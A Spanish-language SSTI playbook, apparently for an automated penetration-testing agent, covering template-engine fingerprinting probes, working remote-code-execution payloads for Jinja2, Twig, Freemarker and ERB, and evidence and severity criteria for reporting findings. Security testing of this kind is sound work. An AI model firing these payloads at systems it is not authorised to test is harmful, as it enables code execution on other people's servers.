# Playbook: SSTI (Server-Side Template Injection)

RCE vía motor de plantillas — común en apps que generan contenido dinámico
(emails, reportes, páginas personalizadas) desde input de usuario.

1. **Fingerprint del engine**: probar en cualquier campo que se refleje en HTML/
   texto generado: `${7*7}`, `{{7*7}}`, `<%= 7*7 %>`, `#{7*7}`, `${{7*7}}`. Si
   alguno devuelve `49` (en vez del literal), hay SSTI — el payload que funcionó
   indica el engine.
2. **Identificar el engine específico** por la sintaxis que respondió:
   - `{{7*7}}` → Jinja2/Twig (Python/PHP)
   - `${7*7}` → Freemarker/Velocity (Java) o EL
   - `<%= 7*7 %>` → ERB (Ruby)
   - `#{7*7}` → Ruby/Play framework
3. **Payload de RCE según engine** (usar el mínimo necesario para confirmar, no
   para explotar destructivamente):
   - Jinja2: `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}`
   - Twig: `{{ ['id']|filter('system') }}` (según versión/config)
   - Freemarker: `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`
   - ERB: `<%= system('id') %>`
4. **Si el fingerprint no ejecuta código pero sí evalúa expresiones**: confirmalo
   igual como SSTI (impacto medio-alto: puede leer variables de contexto/config
   internos) aunque no llegues a RCE completo.

**Evidencia mínima para `add_finding`:** el payload de fingerprint con la
evaluación matemática confirmada (`49`), y si se llegó a RCE, el output de `id`/
`whoami`.

**Criterio de severidad:** critical si hay RCE confirmado; high si solo se
confirma evaluación de expresiones sin poder llegar a ejecución (depende del
engine/sandboxing); nunca reportar como confirmed solo con la sospecha de
sintaxis reflejada sin el `49` verificado.
